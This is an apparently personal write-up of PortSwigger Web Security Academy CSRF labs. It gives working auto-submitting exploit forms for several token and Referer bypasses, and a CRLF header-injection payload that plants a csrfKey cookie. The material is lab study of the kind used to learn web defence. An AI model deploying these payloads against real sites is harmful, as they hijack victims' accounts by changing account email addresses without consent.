Requirement for csrf

	• Relevant action
	• Cookie based session handling
	• No unpredictable request parameters 

Can be automated using  burpesuite pro edition 



```
<form method="POST" action="https://0a39003e04cac15b80985df6004b00b0.web-security-academy.net/my-account/change-email">
	 <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> 
<script> 
	document.forms[0].submit();
 </script>
```

From <https://portswigger.net/web-security/csrf/lab-no-defenses> 


```
<form method="POST" action="https://0a39003e04cac15b80985df6004b00b0.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="viet@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```
**CSRF where token validation depends on request method**




Intercept we notice a csrf token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c04ead97-a67a-46ac-9cec-52adef46971d)


Remove csrf token we get a response that we need to change it
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6c89d56c-5b43-4c9b-a612-d9268239279b)



Changine request to get and removing email change we can send it and get a 302 response
"Follow redirection" we notice that we changed the email without a csrf token
```
<form action="https://0a05007c04bf708c81e28a7200120078.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="viet2@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

**CSRF where token validation depends on token being present**

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1b0c0949-c707-4f48-ab19-527524cf985e)


Deleting csrf parameter result in the 302 response 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/771e5618-9d4d-4112-af7c-a90bee8ca4e2)


Exploit: 
```
<form method="POST" action="https://0aa1003d040b2b3f81817a48001f00f2.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="vi@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

**CSRF where token is not tied to user session**

Cant changed email when removing csrf token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7f8f8bc7-fb21-49e1-98a5-c9e787f3e597)

Cant change to get request either to change email
See if csrf token is tied to user session
Check by logging into another user account and copying there csrf token 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b26f4b63-6f22-490f-aee2-e96c485aae5c)

 



Replacing the csrf parmeter we get a 302 response 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/16b7e052-d04d-40c3-a6b2-b7a3357a4789)



CSRF token is used every time we changed an account so if we want to change another one we need another csrf token 
Our exploit:
```
<html>
    <body>
    <script> history.pushState(' ',' ', '/')</script>
    <form action="https://0a08004803a6fb1a8040b860005c004f.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="hidden" name="csrf"  value="aIOCt2aXj52tiS7BFW5EVCy8k7UG8siS" />
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```

**CSRF where token is tied to non-session cookie**

We got a csrfkey
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0db13860-e234-45b5-a8cc-7198ecc73da2)


Looks like csrf key is tied to session key 

Testing csrf token and csrf key 
```
1. Check if csrf token is tied to the csrf cookie 
2. Submit a valid csrf token from another user
```
	
Test case 1 fail
Changing csrf parameter doesn't give 302 response

Test case 2 fail
Using another user csrf 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/310db429-3ca8-4448-a95d-093e30d6ee56)


Checking other cookie parameter

Cookie: Status 302
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ac9e04c0-338c-41d5-b335-b420fae55b48)

```
session=0HKiqjYhk7G0eFu5p388lxZHhaQKP0ny; 
csrfKey=fbdsO5lxQm8jH4t5GvzCOG0nnDVlfcPC
```
	
	
Exploit:
Case 2 is met 
To exploit
```
1.  inject a csrfKey cookie in the user session (http header injection)
2. Send a csrf attack to the victim with a known csrf token 

?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY
Get a 302 when we set the key from intercepting search
``` 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3e0a38e5-9333-444e-a6bd-a4d89399af54)


Exploit:

```
<html>
    <body>
    <script> history.pushState('','', '/')</script>
    <form action="https://0ab6004a037bf6198423a1cb00b4004d.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="v@gmail.com"/>
        <input type="hidden" name="csrf"  value="aIOCt2aXj52tiS7BFW5EVCy8k7UG8siS" />
        <input type="submit" value="submit request"/>
    </form>
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

**CSRF where Referer validation depends on header being present**
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7500b508-bbda-4d08-a4cf-e47133e131e9)



Meet 3 requirement for csrf attack

A relevant action: change email
Cookie-based session handling: session cookie
No unpredictable request parameter: no csrf token in parameter 

If we host a typical csrf form 
```
<html>
    <body>
    <script> history.pushState(' ',' ', '/')</script>
    <form action="https://0af6002b044ec32084de63e900bb0053.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d2676c46-8bff-4fc1-8d25-3506009a30b2)


We will get 
"invalid refer header"
There checking the refer header to make sure there no crossdomain request 
Refer header is a optional request header that contain the url of the page that is making the request 
Defend against csrf attack to make sure that the request came from the same domain as the website 
If it came with anything else it will be ban

Refer header is shown on our request 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/41c3f723-4762-49e9-93c4-1f424f379ada)


Not a good defense cause the referer header can be spoof

Testing referer header for csrf attacks:
```
1. Remove the referer header
	Got a 302 response
```
We need to make sure our form don’t accept referer header
Use the meta tag 
Will not include refer tag
```
<html>
    <head>
        <meta name="referrer" content="never">   
    </head>
    <body>
    <script> history.pushState(' ',' ', '/')</script>
    <form action="https://0af6002b044ec32084de63e900bb0053.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```


























